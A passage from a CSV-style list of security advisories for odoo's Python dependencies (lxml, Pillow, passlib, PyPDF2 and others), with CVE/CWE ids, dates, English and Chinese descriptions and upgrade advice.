Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
odoo_odoo,openpyxl,,True,CVE-2017-5992,CWE-611,2017-02-15,"Openpyxl是一个用于读写Excel 2010的Python库。
Openpyxl 2.4.1版本存在XML外部实体注入漏洞。远程攻击者可借助特制的文档利用该漏洞读取本地文件，造成应用程序拒绝服务。",3,0
odoo_odoo,passlib,,True,,CWE-521,2020-05-19,"## Overview

Affected versions of this package are vulnerable to Cryptographic Weakness. The `SHA-256` prehash is unsalted, meaning the resulting `bcrypt` digest is vulnerable to breach correlation attacks.
## Remediation
Upgrade `passlib` to version 1.7.3 or higher.
## References
- [1.7.3 Release Changelog](https://passlib.readthedocs.io/en/stable/history/1.7.html#id1)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/bd0da1bdf0fd17b886212649184f2ce3eb8c8329)
- [BitBucket Issue](https://bitbucket.org/ecollins/passlib/issues/114/bcrypt_sha256-is-vulnerable-to-breach)
",3,0
odoo_odoo,passlib,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`passlib`](https://pypi.python.org/pypi/passlib) are vulnerable to Denial of Service (DoS) attack.

`passlib` is enable `wildcard password` by default, which allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `passlib` to version 1.4 or higher.

## References
- [Readthedocs Passlib ChangeLog](http://passlib.readthedocs.io/en/stable/history/ancient.html#hashes)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/aca22d57fc1d110be722d71180185f411a3374b7?at=1.4)
",3,2
odoo_odoo,pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
odoo_odoo,pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
odoo_odoo,pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
odoo_odoo,pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
odoo_odoo,pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
odoo_odoo,pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
odoo_odoo,pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
odoo_odoo,pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
odoo_odoo,pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
odoo_odoo,pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
odoo_odoo,pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
odoo_odoo,pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
odoo_odoo,pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
odoo_odoo,pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
odoo_odoo,pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
odoo_odoo,pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
odoo_odoo,pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
odoo_odoo,pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
odoo_odoo,pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
odoo_odoo,pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
odoo_odoo,pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
odoo_odoo,pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
odoo_odoo,pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
odoo_odoo,pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
odoo_odoo,pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
odoo_odoo,pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
odoo_odoo,pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
odoo_odoo,pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
odoo_odoo,pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
odoo_odoo,pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
odoo_odoo,pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
odoo_odoo,pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
odoo_odoo,pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
odoo_odoo,pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
odoo_odoo,pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
odoo_odoo,pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
odoo_odoo,pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
odoo_odoo,pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
odoo_odoo,pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
odoo_odoo,pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
odoo_odoo,pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
odoo_odoo,pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
odoo_odoo,pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
odoo_odoo,pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
odoo_odoo,pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
odoo_odoo,pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
odoo_odoo,pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
odoo_odoo,pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
odoo_odoo,pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
odoo_odoo,pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
odoo_odoo,psutil,,True,CVE-2019-18874,CWE-415,2019-11-11,"psutil是一款基于Python的进程和系统监视库。
psutil 5.65及之前版本中存在资源管理错误漏洞。远程攻击者可借助特制数据利用该漏洞导致应用程序崩溃（拒绝服务）。",2,2
odoo_odoo,psutil,,True,,CWE-362,2023-11-01,"## Overview
[psutil](https://github.com/giampaolo/psutil) is a cross-platform lib for process and system monitoring in Python

Affected versions of this package are vulnerable to Race Condition in the `files/threads/connections` process.
## Remediation
Upgrade `psutil` to version 0.5.1 or higher.
## References
- [GitHub Commit](https://github.com/giampaolo/psutil/commit/163f29d25f4c5d573fbd436e658829afe95bc1d9)
",3,0
odoo_odoo,pyopenssl,,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
odoo_odoo,pyopenssl,,True,CVE-2013-4314,CWE-20,2013-09-09,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。pyOpenSSL是其中的一个OpenSSL接口。
pyOpenSSL 0.13之前版本中的X509Extension类中存在漏洞，该漏洞源于程序没有正确地处理X.509证书的Subject Alternative Name字段中域名中的‘’字符。中间人攻击者可借助由合法证书颁发机构所发布的特制证书，利用该漏洞欺骗任意SSL服务器。",2,0
odoo_odoo,pyopenssl,,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
odoo_odoo,PyPDF2,,True,CVE-2022-24859,CWE-835,2022-04-18,"PyPDF2是一个免费的开源纯 python PDF 库。能够拆分、 合并、 裁剪和转换 PDF 文件的页面。
PyPDF2 存在安全漏洞，该漏洞源于在 1.27.5 之前的版本中，使用此漏洞的攻击者可以制作 PDF，如果代码尝试获取内容流，则如果 PyPDF2 导致无限循环。",3,0
odoo_odoo,PyPDF2,,True,,CWE-400,2023-01-02,"## Overview
[PyPDF2](https://pypi.org/project/PyPDF2) is an A pure-python PDF library capable of splitting, merging, cropping, and transforming PDF files

Affected versions of this package are vulnerable to Denial of Service (DoS) due to invalid object. Exploiting this vulnerability is possible when reading the metadata.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

